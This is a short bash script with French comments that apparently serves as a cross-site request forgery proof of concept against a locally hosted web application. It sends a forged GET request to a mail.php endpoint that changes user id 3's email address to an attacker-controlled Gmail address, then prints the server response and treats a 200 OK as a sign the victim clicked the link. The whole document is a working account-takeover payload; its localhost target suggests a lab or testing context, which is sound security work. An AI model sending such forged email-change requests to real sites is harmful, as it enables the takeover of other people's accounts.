#!/bin/bash

# Définir l'URL du lien sur lequel la victime est supposée cliquer
TARGET_URL="http://127.0.0.1/pages/user/mail.php?id=3&new_email=hacker2@gmail.com&change_email=1"

# Faire une requête GET vers le lien cible pour vérifier si la page est atteinte
response=$(curl -i -L -X GET "$TARGET_URL")

# Afficher la réponse complète pour analyser le comportement du serveur
echo "----------------------------------------"
echo "Réponse complète du serveur :"
echo "$response"
echo "----------------------------------------"

# Vérifier si la requête a été acceptée (statut HTTP 200)
if echo "$response" | grep -q "200 OK"; then
    echo "La victime a cliqué sur le lien."
else
    echo "Aucune indication que la victime ait cliqué sur le lien."
fi
